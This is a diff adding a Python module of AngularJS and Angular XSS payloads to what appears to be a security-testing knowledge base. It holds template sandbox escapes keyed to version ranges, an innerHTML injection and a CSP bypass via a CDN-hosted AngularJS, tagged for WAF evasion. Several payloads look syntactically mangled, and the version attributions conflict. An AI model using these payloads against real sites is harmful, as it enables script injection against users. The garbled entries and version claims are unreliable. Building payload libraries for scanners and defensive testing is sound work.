@@ -1,0 +1,203 @@
+#!/usr/bin/env python3
+"""
+Project: BRS-KB (BRS XSS Knowledge Base)
+Company: EasyProTech LLC (www.easypro.tech)
+Dev: Brabus
+Date: 2025-12-26 UTC
+Status: Refactored
+Telegram: https://t.me/EasyProTech
+
+Angular Framework XSS Payloads
+"""
+
+from ..models import PayloadEntry
+
+
+ANGULAR_PAYLOADS = {
+    "angular_1": PayloadEntry(
+        payload="{{constructor.constructor('alert(1)')()}}",
+        contexts=["template"],
+        severity="critical",
+        cvss_score=8.5,
+        description="AngularJS sandbox escape (1.x)",
+        tags=["angular", "angularjs", "sandbox-escape"],
+        reliability="high",
+    ),
+    "angular_2": PayloadEntry(
+        payload="{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}",
+        contexts=["template"],
+        severity="critical",
+        cvss_score=8.5,
+        description="AngularJS 1.2.0-1.2.18 sandbox escape",
+        tags=["angular", "angularjs", "sandbox-escape", "prototype"],
+        reliability="medium",
+    ),
+    "angular_3": PayloadEntry(
+        payload="{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x]alert(1)');}}",
+        contexts=["template"],
+        severity="critical",
+        cvss_score=8.5,
+        description="AngularJS 1.2.19-1.2.23 sandbox escape",
+        tags=["angular", "angularjs", "sandbox-escape"],
+        reliability="medium",
+    ),
+    "angular_4": PayloadEntry(
+        payload='{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
+        contexts=["template"],
+        severity="critical",
+        cvss_score=8.5,
+        description="AngularJS 1.3.0-1.3.19 sandbox escape",
+        tags=["angular", "angularjs", "sandbox-escape", "sort"],
+        reliability="medium",
+    ),
+    "angular_5": PayloadEntry(
+        payload="{{[].pop.constructor('alert(1)')()}}",
+        contexts=["template"],
+        severity="critical",
+        cvss_score=8.5,
+        description="AngularJS array method constructor",
+        tags=["angular", "angularjs", "array", "constructor"],
+        reliability="high",
+    ),
+    "angular_6": PayloadEntry(
+        payload="<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>",
+        contexts=["html_content"],
+        severity="critical",
+        cvss_score=8.5,
+        description="Angular 2+ innerHTML binding",
+        tags=["angular", "angular2+", "innerHTML"],
+        reliability="high",
+    ),
+    "angular_7": PayloadEntry(
+        payload="{{$on.constructor('alert(1)')()}}",
+        contexts=["template"],
+        severity="critical",
+        cvss_score=8.5,
+        description="AngularJS $on constructor",
+        tags=["angular", "angularjs", "$on"],
+        reliability="medium",
+    ),
+    # === PortSwigger AngularJS Sandbox Escapes ===
+    "ps-angular-1.0.1-1.1.5": PayloadEntry(
+        payload="{{constructor.constructor('alert(1)')()}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.0.1-1.1.5",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.2.0-1.2.1": PayloadEntry(
+        payload="{{a]constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.2.0-1.2.1",
+        tags=["portswigger", "angular", "sandbox-escape", "prototype"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.2.2-1.2.5": PayloadEntry(
+        payload="{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]alert(1)//';}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.2.2-1.2.5",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.2.6-1.2.18": PayloadEntry(
+        payload="{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.2.6-1.2.18",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.2.19-1.2.23": PayloadEntry(
+        payload='{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.2.19-1.2.23",
+        tags=["portswigger", "angular", "sandbox-escape", "sort"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.2.24-1.2.29": PayloadEntry(
+        payload='{{"a]".constructor.prototype.charAt="".valueOf;$eval("x]alert(1)//");}}',
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.2.24-1.2.29",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.3.0": PayloadEntry(
+        payload="{{!ready && (ready = true) && (! constructor.prototype.charAt = [].join) && $eval('x]alert(1)//');}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.3.0",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.3.1-1.3.2": PayloadEntry(
+        payload="{{a]constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.3.1-1.3.2",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.4.0-1.4.9": PayloadEntry(
+        payload="{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.4.0-1.4.9",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.5.0-1.5.8": PayloadEntry(
+        payload="{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x]alert(1)');}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS sandbox escape 1.5.0-1.5.8",
+        tags=["portswigger", "angular", "sandbox-escape"],
+        reliability="high",
+        waf_evasion=True,
+    ),
+    "ps-angular-1.6.0+": PayloadEntry(
+        payload="{{$on.constructor('alert(1)')()}}",
+        contexts=["html_content", "template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS 1.6.0+ (no sandbox)",
+        tags=["portswigger", "angular", "1.6+"],
+        reliability="high",
+    ),
+    "ps-csp-angular-callback": PayloadEntry(
+        payload="<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
+        contexts=["html_content"],
+        severity="critical",
+        cvss_score=9.0,
+        description="AngularJS CSP bypass via JSONP callback",
+        tags=["portswigger", "csp-bypass", "angular", "jsonp"],
+        reliability="high",
+        waf_evasion=True,
+        bypasses=["csp"],
+    ),
+}
+
+ANGULAR_PAYLOADS_TOTAL = len(ANGULAR_PAYLOADS)
